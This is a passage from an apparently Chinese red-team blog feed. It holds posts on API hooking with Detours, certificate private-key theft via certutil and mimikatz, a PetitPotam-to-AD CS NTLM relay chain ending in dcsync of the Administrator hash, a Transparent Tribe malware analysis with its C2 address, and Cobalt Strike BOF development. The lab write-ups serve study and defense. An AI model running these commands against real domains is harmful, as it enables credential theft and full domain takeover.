lpText, LPCSTR lpcaption, UINT utype) {        UnHookFunction(); //取消hook        int ret = MessageBoxA(0, &quot;HOOK&quot;, &quot;title&quot;, MB_OK);        HookFunction((PROC)TestMessageBoxA); //继续hook        return ret;}BOOL APIENTRY DllMain(HMODULE hModule,        DWORD  ul_reason_for_call,        LPVOID lpReserved){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               HookFunction((PROC)TestMessageBoxA);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/2a7df4e7221353fb.png" alt=""></p><p>其他例子SetConsoleTitleW Hook<br><img src="https://i.bmp.ovh/imgs/2021/08/f41515400193bf8d.png" alt=""></p><p>Hook如下，一执行命令cmd的标题就会被更改<br><img src="https://i.bmp.ovh/imgs/2021/08/621519e81c080c2d.png" alt=""></p><p><strong>总的来说x86用内嵌asm，x64用memcpy插机器码</strong></p><h2 id="DetOurs库的使用"><a href="#DetOurs库的使用" class="headerlink" title="DetOurs库的使用"></a>DetOurs库的使用</h2><p>这玩意x64是商业版（<br>github地址:<a href="https://github.com/Microsoft/Detours" target="_blank" rel="noopener">https://github.com/Microsoft/Detours</a><br>下完进入到目录，用vs命令行的nmake编译。然后将lib和include添加到项目<br><img src="https://z3.ax1x.com/2021/08/19/f7sgvd.png" alt=""></p><p>Hook MessageBoxA</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;detours.h&gt;#pragma comment(lib,&quot;detours.lib&quot;)static INT(WINAPI *OldMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT) = MessageBoxA; //定义被Hook的API函数原型INT WINAPI MyMessAgeBoxA(HWND, LPCSTR, LPCSTR, UINT) {        OldMessageBoxA(NULL, &quot;Hook&quot;, &quot;Title&quot;, MB_OK); //注意调用的被hook的函数时要使用自己定义的，否则会崩溃        return 0;}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                                       ){        int ts;        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               ts = DetourTransactionBegin();               if (ts == NO_ERROR) {                       DetourUpdateThread(GetCurrentThread());                       DetourAttach(&amp;(PVOID&amp;)OldMessageBoxA, MyMessAgeBoxA);                       DetourTransactionCommit();               }               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p><img src="https://z3.ax1x.com/2021/08/19/f7sWDI.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/LyShark/p/11692436.html" target="_blank" rel="noopener">https://www.cnblogs.com/LyShark/p/11692436.html</a><br><a href="https://developer.aliyun.com/article/568432" target="_blank" rel="noopener">https://developer.aliyun.com/article/568432</a><br><a href="https://www.write-bug.com/article/1851.html" target="_blank" rel="noopener">https://www.write-bug.com/article/1851.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Inline Hook是在程序调用某个API函数之前，在其上方设置指令跳转到自己写的的函数&lt;/p&gt;
&lt;h2 id=&quot;实验&quot;&gt;&lt;a href=&quot;#实验&quot; class=&quot;headerlink&quot; title=&quot;实验&quot;&gt;&lt;/a&gt;实验&lt;/h2&gt;&lt;p&gt;Hoo kMessageBox测试</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>滥用证书私钥</title>
    <link href="http://422926799.github.io/posts/75f27601.html"/>
    <id>http://422926799.github.io/posts/75f27601.html</id>
    <published>2021-08-13T20:35:38.000Z</published>
    <updated>2021-08-13T21:16:56.646Z</updated>
    
    <content type="html"><![CDATA[<p>七夕放首老婆的歌</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=484058598&auto=1&height=66"></iframe><p>原文链接：<a href="https://www.4hou.com/posts/w2og" target="_blank" rel="noopener">https://www.4hou.com/posts/w2og</a><br>安装证书服务就不说了，自己搜去弄</p><h2 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h2><blockquote><p>在传统的kerberos认证的时候，是使用用户密码进行认证的。回顾下申请TGT的过程。<br>用用户hash加密时间戳作为value，type为PA-ENC-TIMESTAMP， 放在PA_DATA上。KDC收到请求，使用用户hash解密value的值得到时间戳跟当前时间做比对，如果在合理的范围(正常五分钟)，就认证通过。<br>事实上也可以使用证书作为认证，这也是这次spectorops关于ADCS研究的最大亮点，后面漏洞紧紧围绕这点。<br>RFC4556引入了对 Kerberos 预身份验证的公钥加密支持。这个RFC 的title是Public Key Cryptography for Initial Authentication in Kerberos，后面我们使用简称PKINIT来介绍使用证书进行kerberos身份认证这种方法。<br>PKINIT同样也使用时间戳，但不是使用用户密码派生密钥加密消息，而是使用属于证书的私钥对消息进行签名。</p></blockquote><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>DC windows server 2019<br>AD CS Windows Server 2008<br>非域内机器windows 7</p><h2 id="测试准备"><a href="#测试准备" class="headerlink" title="测试准备"></a>测试准备</h2><p>certtmlp.msc - 证书模板控制台<br>certsrv.msc - 证书颁发机构<br>certmgr.msc - 证书管理</p><p>给一域用户安装个用户证书<br>win+r运行certmgr.msc，选择个人，右键，所有任务-&gt;申请新证书。请求证书选择用户（即可生成当前用户的一个证书）<br><img src="https://z3.ax1x.com/2021/08/14/fsXTFU.png" alt=""></p><p>安装后如下<br><img src="https://z3.ax1x.com/2021/08/14/fsX7YF.png" alt=""></p><p>执行certutil -user -store My可以看到用户证书<br><img src="https://z3.ax1x.com/2021/08/14/fsXLl9.png" alt=""></p><h2 id="场景模拟"><a href="#场景模拟" class="headerlink" title="场景模拟"></a>场景模拟</h2><p>假设一台域内机器带有一个用户证书要怎么利用他?<br>先把这个证书dump下来（需要包括私钥）可以用certutil或者直接用certmgr.msc dump</p><pre><code>certutil -user -exportPFX &lt;SHA1 hash&gt; test1.pfx</code></pre><p>（dump的时候需要给证书设置个密码(如果该证书默认没密码的话)）<br><img src="https://z3.ax1x.com/2021/08/14/fsXOyR.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/14/fsXXO1.png" alt=""></p><p>（使用certutil导出）<br><img src="https://z3.ax1x.com/2021/08/14/fsXzTK.png" alt=""></p><p>这里有一种情况不能通过这两种方式dump，有些证书在导入的时候需要密码或者<strong>不勾选标志此密钥为可导出的密钥</strong>，需要mimikatz dump<br><img src="https://z3.ax1x.com/2021/08/14/fsj9YD.png" alt=""></p><p>dump出现如下问题<br><img src="https://z3.ax1x.com/2021/08/14/fsjiSH.png" alt=""></p><p>使用mimikatz的crypto::capi修改lsass，然后在dump （这个报错也不影响，具体原因不知）<br>（这证书dump下来如果导入的时候设置了密码也没用，验证根本过不了，也不知道有啥用）</p><pre><code>crypto::capi #修改lsasscrypto::certificates /systemstore:local_machine /store:my /export</code></pre><p>（没以administrator权限执行）<br><img src="https://z3.ax1x.com/2021/08/14/fsjk6A.png" alt=""></p><p>（以administrator权限执行）<br><img src="https://i.bmp.ovh/imgs/2021/08/decd25cc3ceaa229.png" alt=""></p><p>尝试用Rubeus进行申请票据<br>知道证书密码或者dump证书的时候没设置不可dump可自己设置密码</p><pre><code>Rubeus.exe asktgt /user:csadmin /password:123456 /certificate:admin.pfx /domain:joker.local /dc:WIN-0ASLVBO5ID9.joker.local #123456是私钥密码(dump证书的时候设置的)</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/3f344d91d72244e3.png" alt=""></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>理论点<br><img src="https://i.bmp.ovh/imgs/2021/08/a735763c31d0fe83.png" alt=""></p><p><strong>在域内利用</strong><br>Rubeus.exe申请票据导入到当前进程，然后获取hash用wmiexec.py连接之类的<br>（清空原有的票据进行测试）<br><img src="https://i.bmp.ovh/imgs/2021/08/f4dd4b544a516e3e.png" alt=""></p><p>Rubeus进行申请票据<br><img src="https://i.bmp.ovh/imgs/2021/08/aa2df3a2f23d4cb5.png" alt=""></p><p>获取hash<br><img src="https://i.bmp.ovh/imgs/2021/08/3969335a61d64673.png" alt=""></p><p><strong>不在域内利用</strong><br>将pfx移动到win7，并导入证书。在hosts文件添加域控IP和加入被控制机器的IP和机器名或者DNS改为域控的IP （代理进内网）<br><img src="https://i.bmp.ovh/imgs/2021/08/ed2393d62b472888.png" alt=""></p><p>利用keke获取ntlm，然后用wmiexec.py连接之类的</p><pre><code>tgt::pac /subject:csadmin /castore:current_user /domain:joker.local</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/0cf25ddee50a166f.png" alt=""></p><p>直接利用mimikatz令牌注入用psexec连接AD CS服务器<br>（pth ntlm到新进程psexec连接）<br><img src="https://i.bmp.ovh/imgs/2021/08/c08063c93c568bc2.png" alt=""></p><h2 id="常见搜索证书的位置"><a href="#常见搜索证书的位置" class="headerlink" title="常见搜索证书的位置"></a>常见搜索证书的位置</h2><blockquote><p>我们经常可以在邮件，磁盘里面看到证书，我们一般按照后缀来搜索证书的，我们一般关注以下后缀<br>1、key后缀的，只包含私钥<br>2、crt/cer 后缀的，只包含公钥<br>3、csr后缀的，证书申请文件，不包含公钥，也不包含私钥。没啥用<br>4、pfx,pem,p12后缀的，包含公私钥，我们最喜欢的。<br>搜索文件后缀的每个人使用的工具不一样，我个人比较喜欢的是SharpSearch，.Net的项目，支持内存加载，可以写成CNA插件。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;七夕放首老婆的歌&lt;/p&gt;
&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;//music.163.com/outchain/p</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>使用PetitPotam到NTLM中继到域管理员</title>
    <link href="http://422926799.github.io/posts/d55c75ac.html"/>
    <id>http://422926799.github.io/posts/d55c75ac.html</id>
    <published>2021-08-07T11:57:32.000Z</published>
    <updated>2021-08-07T12:47:46.460Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>最近披露的几个漏洞，分别是：</p><ul><li>MS-EFSRPC – 又名 PetitPotam</li><li>滥用 AD CS 角色的凭证中继<br>任何具有内部网络访问权限的攻击者（例如网络中的网络钓鱼客户端或恶意植入设备）都可以在没有任何初始凭据的情况下接管整个 Active Directory 域。当前在默认配置中，域控制器和 AD CS 容易受到这种攻击。<br>当 PetitPotam 被利用并将 NTLM 凭据中继到 Active Directory 证书服务时，攻击者无需事先对域进行任何身份验证即可获得域管理员权限。本文将详细介绍漏洞利用所需的步骤，然后介绍 PetitPotam 的缓解措施。<br>攻击者可以使用 PetitPotam 触发域控制器以将 NTLM 凭据中继到所选主机。然后可以将域控制器的 NTLM 凭据中继到 Active Directory 证书服务 (AD CS) Web 注册页面，并且可以注册 DC 证书。然后可以使用此证书来请求 TGT（票证授予票证）并通过 Pass-The-Ticket 破坏整个域。<br>AD CS（Active Directory 证书服务）特别有趣，因为<strong>它提供默认接受基于 NTLM 的身份验证的角色服务。这些服务具体包括证书颁发机构 Web 注册和证书注册 Web 服务。</strong></li></ul></blockquote><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>这几天踩的坑点：不能在DC安装AD证书服务进行测试，必须分开安装，具体情况是反射自身出问题还是什么不知道<br>DC: Windows Server 2019  IP:192.168.93.246<br>AD CS(证书服务器):Windows Server 2008 IP:192.168.93.141<br>Attack Kali IP:192.168.93.133</p><p>准备的工具:</p><ul><li>Rubeus 1.6.4</li><li>mimikatz</li><li>impacket分支(ntlmrelayx-adcs-attack)</li></ul><p>环境搭建过程：<br>（由小离提供的教程）<br><a href="https://github.com/422926799/note/blob/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BD%BF%E7%94%A8%20PetitPotam%20%E5%88%B0%20NTLM%20%E4%B8%AD%E7%BB%A7%E5%88%B0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.pdf" target="_blank" rel="noopener">https://github.com/422926799/note/blob/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BD%BF%E7%94%A8%20PetitPotam%20%E5%88%B0%20NTLM%20%E4%B8%AD%E7%BB%A7%E5%88%B0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.pdf</a></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li>证书注册 Web 界面，通过安装证书颁发机构 Web 注册角色。作为在http://<adcsserver>/certsrv/ 上运行的 IIS 托管的 ASP Web 注册应用程序公开</adcsserver></li><li>证书注册服务 (CES)，通过安装证书注册 Web 服务角色。通过安装证书注册策略 Web 服务角色，与证书注册策略 (CEP) Web 服务协同工作。白皮书中的详细信息。</li><li>网络设备注册服务 (NDES)，通过安装网络设备注册服务 角色。作为白皮书中描述的一系列接口公开。</li><li>注册 HTTP 端点没有启用 HTTPS/没有启用任何 NTLM 中继保护（默认允许NTLM）</li><li>GPO 禁用 NTLM 身份验证或将关联的 IIS 应用程序配置为仅接受 Kerberos 身份验证</li></ul><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol><li>使用 PetitPotam 触发从域控制器到侦听器的 NTLM 身份验证（运行响应程序或 ntlmrelayx）</li><li>使用 ntlmrelayx 使用“KerberosAuthentication”或“DomainControllers”AD CS 模板将 DC 的凭据中继到启用了 Web 注册（必须启用 NTLM 身份验证并默认启用）的 AD CS（Active Directory 证书服务）服务器。</li><li>获取通过NTLM中继获取的Base64 PKCS12证书</li><li>使用Base64 PKCS12 cert导入Kekeo请求TGT（Ticket Granting Ticket）</li><li>使用 mimikatz 为选择的用户（管理员、Krbtgt 等）转储 LSA 机密</li><li>记下域管理员用户的 NT 哈希值</li><li>使用 wmiexec 以该用户身份获得对域控制器的执行并执行 NT 哈希的哈希传递</li></ol><p>前三步流程图<br><img src="https://z3.ax1x.com/2021/08/07/fMckuT.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>下载新版impacket切换到ntlmrelayx-adcs-attack分支</p><pre><code>git clone https://github.com/ExAndroidDev/impacket.git # Clone the custom ntlmrelayx repocd impacketgit checkout ntlmrelayx-adcs-attack # checkout to the right branch - this caught me outsudo pip3 install -r requirements.txtsudo python3 setup.py install</code></pre><p>开启监听</p><pre><code>sudo python3 ntlmrelayx.py -debug -smb2support --target http://192.168.93.246/certsrv/certfnsh.asp --adcs --template DomainController</code></pre><p>注：这里模板必须要用DomainController，否则出现以下问题<br><img src="https://z3.ax1x.com/2021/08/07/fMgCIH.jpg" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/07/fMgwFJ.png" alt="开启监听"></p><p>证书机器执行</p><pre><code>PetitPotam.exe &lt;Attack_IP&gt; &lt;DC_IP&gt;</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fMgfFH.png" alt="（执行后在监听那边可以收到base64，这里可能不会出现Attack Sucess关键字但还是成功的）"></p><p><img src="https://z3.ax1x.com/2021/08/07/fMgLTg.png" alt=""></p><p>利用Rubeus获取TGT导入到当前进程</p><pre><code>Rubeus.exe asktgt /outfile:kirbi /user:WIN-0ASLVBO5ID9$ /ptt /certificate:&lt;Base64&gt; #这里的/user为/user:&lt;DC的机器名&gt;$</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fM2fBT.png" alt=""></p><p>利用mimikatz导出域管哈希</p><pre><code>lsadump::dcsync /user:Administrator</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fM2IN4.png" alt=""></p><p>wmicexec.py连接即可<br><img src="https://z3.ax1x.com/2021/08/07/fMRPgI.png" alt=""></p><p>或者也可以dump krbtgt的hash生成金票<br><img src="https://z3.ax1x.com/2021/08/07/fMRADf.png" alt=""></p><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>IIS关闭NTLM验证<br><img src="https://z3.ax1x.com/2021/08/07/fMRK8s.png" alt=""></p><p>只允许kerberos验证<br><img src="https://z3.ax1x.com/2021/08/07/fMR1K0.png" alt=""></p><p>GPO关闭NTLM身份验证<br><img src="https://z3.ax1x.com/2021/08/07/fMRJVU.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/" target="_blank" rel="noopener">https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/</a><br><a href="https://www.youtube.com/watch?v=K0N90sI_GhI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=K0N90sI_GhI</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;最近披露的几个漏洞，分别是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MS-EFSRPC – 又名 PetitPotam&lt;/li</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>透明部落近期利用印度国防部会议记录为诱饵的攻击活动分析</title>
    <link href="http://422926799.github.io/posts/2e79283e.html"/>
    <id>http://422926799.github.io/posts/2e79283e.html</id>
    <published>2021-08-06T17:44:09.000Z</published>
    <updated>2021-08-06T17:56:18.868Z</updated>
    
    <content type="html"><![CDATA[<p>原文链接：<br><a href="https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw</a></p><p>微步沙箱：<a href="https://s.threatbook.cn/report/file/8554b5cace52a0fdf0fd3378e4df6606efb45b8ee686ed5b3c1657633405eb85/?sign=history&amp;env=win7_sp1_enx86_office2013" target="_blank" rel="noopener">https://s.threatbook.cn/report/file/8554b5cace52a0fdf0fd3378e4df6606efb45b8ee686ed5b3c1657633405eb85/?sign=history&amp;env=win7_sp1_enx86_office2013</a><br>md5:7f1f7c5c4b6b486e5ba9340944036285<br><img src="https://z3.ax1x.com/2021/08/07/fuOagU.png" alt=""></p><p>执行恶意VBA分析<br>（先调用shoby_leLedr函数）<br><img src="https://z3.ax1x.com/2021/08/07/fuOBDJ.png" alt=""></p><p>释放C:\ProgramData\HDM Media\davivthain.exe和诱饵文件<br><img src="https://z3.ax1x.com/2021/08/07/fuODb9.png" alt=""></p><p>诱饵文件写入<br><img src="https://z3.ax1x.com/2021/08/07/fuOyU1.png" alt=""></p><p>davivthain.exe<br>md5:3c2b45a6d878cc9f30a5dc10abf400a1</p><blockquote><p>检查是否存在C:\Users\geyixian\AppData\Roaming\Microsoft\Windows\Templates\dihakhvartik.zip，存在则将其进行解压并执行<br><img src="https://z3.ax1x.com/2021/08/07/fuOgC6.png" alt=""></p></blockquote><p>若C:\Users\geyixian\AppData\Roaming\Microsoft\Windows\Templates\dihakhvartik.zip不存在，则将创建C:\ProgramData\Hithviwia目录，并通过getWin()函数读取资源数据，并根据操作系统版本选择相应内容保存为trbgertrnion.zip文件，解压执行<br><img src="https://z3.ax1x.com/2021/08/07/fuORgO.png" alt=""></p><p>getShin函数<br>获取操作系统版本，判断“wia07”和“wia08”文件是否存在，若存在则将其删除，然后从资源文件“Resources.data”读取数据保存为data.zip，并解压到C:\Users\geyixian\AppData\Roaming\Microsoft\Windows\Templates，再根据操作系统版本读取相应的文件内容。<br><img src="https://z3.ax1x.com/2021/08/07/fuOWvD.png" alt=""></p><p>drmaiprave.exe<br>md5:77c29d464efcae961424ae050453ef11<br>首先设置开机自启<br><img src="https://z3.ax1x.com/2021/08/07/fuOhKe.png" alt=""></p><p>完成初始化操作之后便开始与C2通信<br>（C2 IP:66.154.112.206 PORT:6188，如果端口连接失败从数组元素挨个测试）<br><img src="https://z3.ax1x.com/2021/08/07/fuO4DH.png" alt=""></p><p>IP解码<br><img src="https://z3.ax1x.com/2021/08/07/fuO5bd.png" alt=""><br><img src="https://z3.ax1x.com/2021/08/07/fuOoVA.png" alt=""></p><p>c2对应的指令解析<br><img src="https://z3.ax1x.com/2021/08/07/fuO75t.png" alt=""></p><p>c2指令   对应函数       操作<br>gey7tavs machine_procss 进程枚举<br>thy7umb  images_details GIF录制<br>pry7ocl  save_apps      开机自启注册表添加<br>doy7wf   download_file  文件保存<br>scy7rsz  dsk_scrn_size  设置截屏大小<br>fiy7lsz     ile_details    文件详情获取<br>csy7dcrgn seye_scren    屏幕截图<br>diy7rs    show_send_drives 硬盘数量枚举<br>dey7lt    tras_files     文件删除<br>afy7ile   seynd_auto    文件上传<br>udy7lt    remove_account 当前路径保存名为iaknhan.exe并运行<br>liy7stf   see_folders   文件夹遍历获取目录下的文件名（包括文件详细信息获取）<br>iny7fo    account_infos 系统版本号和当前进程所在路径获取<br>ruy7nf    Process.Start(procss_type[1].Split(new char[]{‘&gt;’})[0]);  运行指定进程<br>fiy7le    move_files    文件移动<br>fly7es    see_files     文件夹遍历获取文件名</p><p><img src="https://z3.ax1x.com/2021/08/07/fuObPP.png" alt=""></p><p>原文链接：<br><a href="https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;原文链接：&lt;br&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/3Je-DmyQrqNHxzRo70FTJw&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://mp.weixin.qq.com/s/3Je-DmyQrq</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>CS 4.1 BOF开发</title>
    <link href="http://422926799.github.io/posts/e42bb01c.html"/>
    <id>http://422926799.github.io/posts/e42bb01c.html</id>
    <published>2021-07-28T13:54:39.000Z</published>
    <updated>2021-07-28T14:08:51.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="BOF介绍"><a href="#BOF介绍" class="headerlink" title="BOF介绍"></a>BOF介绍</h2><p>信标对象文件 (BOF) 是一个已编译的 C 程序，按照约定编写，允许它在信标进程中执行并使用内部信标 API。BOF 是一种使用新的后开发功能快速扩展 Beacon 代理的方法。</p><h2 id="BOF是如何执行的"><a href="#BOF是如何执行的" class="headerlink" title="BOF是如何执行的"></a>BOF是如何执行的</h2><p>对于 Beacon 来说，BOF 只是一个位置无关的代码块，它接收指向某些 Beacon 内部 API 的指针。<br>对于 Cobalt Strike 而言，BOF 是由 C 编译器生成的目标文件。Cobalt Strike 解析此文件并充当其内容的链接器和加载器。这种方法允许您编写与位置无关的代码，用于 Beacon，而无需繁琐的体操来管理字符串和动态调用 Win32 API。</p><h2 id="BOF缺陷"><a href="#BOF缺陷" class="headerlink" title="BOF缺陷"></a>BOF缺陷</h2><ol><li>BOF 是调用 Win32 API 和有限 Beacon API 的单文件 C 程序。不要期望使用此机制链接其他功能或构建大型项目。</li><li>Cobalt Strike 不会将您的 BOF 链接到 libc。这意味着您仅限于编译器内部函数（例如，Visual Studio 上的 __stosb for memset）、公开的 Beacon 内部 API、Win32 API 以及您编写的函数。您可能无法通过 BOF 使用许多常用函数（例如 strlen、stcmp 等）。</li><li>BOF 在您的 Beacon 代理内部执行。如果 BOF 崩溃，有可能导致Beacon崩溃</li><li>Cobalt Strike 期望您的 BOF 是短时间运行的单线程程序。BOF 将阻止其他 Beacon 任务和功能的执行。异步或长时间运行的任务没有 BOF<br>模式。如果要构建长时间运行的功能，请考虑在牺牲进程内运行的反射 DLL。</li></ol><p>编译的方式</p><pre><code>要使用 Visual Studio 编译它：cl.exe /c /GS- hello.c /Fohello.o要使用 x86 MinGW 编译它：i686-w64-mingw32-gcc -c hello.c -o hello.o要使用 x64 MinGW 编译它：x86_64-w64-mingw32-gcc -c hello.c -o hello.o</code></pre><p>x64 beacon对应加载x64 gcc编译的bof文件，x86 beacon对应加载x86 gcc编译的bof文件</p><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><pre><code>* cs 4.1或者以上的版本* 从官方下载beacon.h -&gt; https://www.cobaltstrike.com/downloads/beacon.h</code></pre><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>cna主要使用的几个函数和过程：<br>先了解几个函数：</p><pre><code>* bof_pack - 打包参数传入到BOF里的函数* beacon_inline_execute - 调用BOF里面的函数</code></pre><p><strong>bof_pack</strong><br>$1 - Beacon ID<br>$2 - 打包数据的格式化字符串 -&gt; (例如Socket里的Packet操作)</p><pre><code>此函数将其参数打包成一个二进制结构，以便与&amp;beacon_inline_execute一起使用。此处的格式字符串选项对应于 BOF 文件可用的 BeaconData* C API。该 API 根据它可以打包的每种类型的要求处理数据和提示的转换。</code></pre><p>文档链接：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#bof_pack" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html#bof_pack</a></p><p><strong>beacon_inline_execute</strong><br>$1 - Beacon ID<br>$2 - 读取了BOF文件的数据<br>$3 - 要调用的函数名称<br>$4 - 要传递给BOF文件的打包参数</p><pre><code>执行信标对象文件</code></pre><p>文档链接：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#beacon_inline_execute" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/functions.html#beacon_inline_execute</a></p><p>BOF文件示例（有参数调用，无Windows API调用）:</p><pre><code class="C">#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#include &quot;beacon.h&quot;void demo(char * args, int length) {    datap  parser; #参数结构定义    char * str_arg;    int    num_arg;    BeaconDataParse(&amp;parser, args, length); #准备数据解析器以从指定缓冲区中提取参数    str_arg = BeaconDataExtract(&amp;parser, NULL); #参数解析赋值于str_arg对应bof_pack函数参数2里的格式化字符串z    num_arg = BeaconDataInt(&amp;parser); #参数解析赋值于num_arg对应bof_pack函数参数2里的格式化字符串i    BeaconPrintf(CALLBACK_OUTPUT, &quot;Message is %s with %d arg&quot;, str_arg, num_arg);}</code></pre><p>cna文件示例：<br>cna调用BOF文件函数过程：</p><pre><code>* 先读取bof文件内容* 调用的函数是否需要参数* 调用函数入口点</code></pre><pre><code>alias hello {    btask($1, script_resource(&quot;demo.o&quot;));    $handle = openf(script_resource(&quot;demo.o&quot;)); #读取BOF文件    $data   = readb($handle, -1); #读取BOF文件内容    closef($handle);    $args = bof_pack($1, &quot;zi&quot;, &quot;Raiden Mei Birthday&quot;, 413); #参数打包    btask($1, &quot;Running Hello BOF&quot;);    beacon_inline_execute($1, $data, &quot;demo&quot;, $args); #调用BOF文件入口点}</code></pre><p>效果如下:<br><img src="https://z3.ax1x.com/2021/07/28/W7sow9.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/07/28/W7yBp6.png" alt=""></p><p>调用Windows API<br>下载<a href="https://github.com/dtmsecurity/bof_helper，执行输入API转换获取BOF里的格式" target="_blank" rel="noopener">https://github.com/dtmsecurity/bof_helper，执行输入API转换获取BOF里的格式</a><br>（自己测试的时候获取失败了，不过看了一下人手转BOF格式也可以）</p><pre><code>python3 bof_helper.py DsGetDcNameA██████╗  ██████╗ ███████╗██╔══██╗██╔═══██╗██╔════╝██████╔╝██║   ██║█████╗██╔══██╗██║   ██║██╔══╝██████╔╝╚██████╔╝██║╚═════╝  ╚═════╝ ╚═╝BOF Helper by @dtmsecurity[Library] DsGetDcNameA is probably in NetApi32[Declaration] DWORD WINAPI DsGetDcNameA(LPCSTR, LPCSTR, GUID*, LPCSTR, ULONG, PDOMAIN_CONTROLLER_INFOA*);[BOF Helper]DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPCSTR, LPCSTR, GUID*, LPCSTR, ULONG, PDOMAIN_CONTROLLER_INFOA*);</code></pre><p><img src="https://z3.ax1x.com/2021/07/28/W7yojS.png" alt=""></p><p>例如CreateProcessA</p><pre><code>BOOL CreateProcessA(  LPCSTR                lpApplicationName,  LPSTR                 lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes,  BOOL                  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);</code></pre><p>到了BOF就变成这样<br>DECLSPEC_IMPORT WINBASEAPI &lt;类型&gt; &lt;API类型&gt; DLL名$&lt;从DLL里面导出的API名称&gt;</p><pre><code>DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(  LPCSTR                lpApplicationName,  LPSTR                 lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,  LPSECURITY_ATTRIBUTES lpThreadAttributes,  BOOL                  bInheritHandles,  DWORD                 